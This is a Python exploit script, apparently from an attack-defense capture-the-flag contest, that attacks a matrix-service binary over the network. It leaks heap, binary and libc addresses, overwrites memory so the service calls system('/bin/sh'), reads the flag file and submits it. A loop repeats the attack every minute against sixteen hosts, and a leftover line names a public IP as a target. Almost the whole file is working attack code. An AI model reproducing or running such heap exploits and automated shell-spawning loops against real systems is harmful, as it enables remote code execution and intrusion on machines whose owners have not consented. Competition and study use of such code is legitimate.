from threading import Thread
from time import sleep

from libad import *
from zio import *

target = ('119.254.101.197', 10000)
target = './apatch'
#target = ('10.0.17.1',9999)

def interact(io):
    def run_recv():
        while True:
            try:
                output = io.read_until_timeout(timeout=1)
                # print output
            except:
                return

    t1 = Thread(target=run_recv)
    t1.start()
    while True:
        d = raw_input()
        if d != '':
            io.writeline(d)


def add(io, hang,lie, buf):
    payload = l32(0xdeadfafa)+l8(0)
    payload += l32(hang)+l32(lie)+l32(len(buf))
    payload += buf
    io.write(payload)
    d = io.read(1)
    assert  ord(d) == 0xcc
    index = l32(io.read(4))
    print hex(index)

def show(io, index):
    payload = l32(0xdeadfafa)+l8(1)+l32(index)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert  ord(d) == 0xcc
    hang = l32(io.read(4))
    lie = l32(io.read(4))
    print 'hang:', hex(hang)
    print 'lie:', hex(lie)
    return hang, lie

def delete(io, index):
    payload = l32(0xdeadfafa)+l8(2)+l32(index)
    io.write(payload)
    d = io.read(1)
    assert ord(d) == 0xcc

def show_row(io, index, row):
    payload = l32(0xdeadfafa)+l8(3)+l32(index)+l32(row)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc
    len = l32(io.read(4))
    print 'len:', hex(len)
    buf = io.read(len)
    #print 'buf:', buf.encode('hex')
    return buf

def add_row(io, index, row1, row2):
    payload = l32(0xdeadfafa)+l8(4)+l32(index)+l32(row1)+l32(row2)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def mul_row(io, index, row, val):
    payload = l32(0xdeadfafa)+l8(5)+l32(index)+l32(row)+l32(val)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def matrix_add(io, index1, index2):
    payload = l32(0xdeadfafa)+l8(6)+l32(index1)+l32(index2)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def matrix_mul(io, index1, index2):
    payload = l32(0xdeadfafa)+l8(7)+l32(index1)+l32(index2)
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc

def expand(io, index, row, buf):
    payload = l32(0xdeadfafa)+l8(8)+l32(index)+l32(row)+buf
    io.write(payload)
    d = io.read(1)
    print hex(ord(d))
    assert ord(d) == 0xcc


def exp2(target):
    io = zio(target, timeout=30, print_read=COLORED(RAW, 'red'), \
             print_write=COLORED(RAW, 'green'))
    add(io, 20, 8, 'a'*0xa0)
    add(io, 20, 8, 'a'*0xa0)
    add(io, 20, 8, 'a'*0xa0)
    delete(io, 0)
    delete(io, 1)
    add(io, 7, 8, "")

    for i in range(7):
        print i, hex(l64(show_row(io, 0, i)))

    heap_base=l64(show_row(io, 0, 1))-0x50
    main_base=l64(show_row(io, 0, 2))-0xb80
    print hex(heap_base), hex(main_base)

    delete(io, 0)
    add(io, 20, 8, "")

    libc_base = (l64(show_row(io, 0, 0))) - 0x3c4b78
    print hex(libc_base)

    system = libc_base + 0x0000000000045390

    delete(io, 0)
    add(io, 18, 8, '')
    d1 = l64('/bin/sh;')-0x0000000800000014
    d = l64(d1)
    for i in range(8):
        val = ord(l64(system)[i]) - ord(l64(main_base + 0xcc0)[i])
        if val < 0:
            val += 0x100
        d += chr(val)
    expand(io, 0, 0x20000002, d)

    add_row(io, 0, 22, 18)
    add_row(io, 0, 25, 19)


    payload = l32(0xdeadfafa)+l8(3)+l32(2)+l32(0)
    io.write(payload)
    io.writeline('./bin/cat flag/flag')
    flag = io.readline()[:-1].strip()
    print target
    print 'flag', flag
    submit_flag(flag)
    io.close()


ips = []
for i in range(1, 17):
    ips.append(  '172.16.'+ str(i)+'.102')

while True:
    for ip in ips:
        try:
            target = (ip, 20002)
            print target
            exp2(target)
        except:
            pass
    sleep(60)
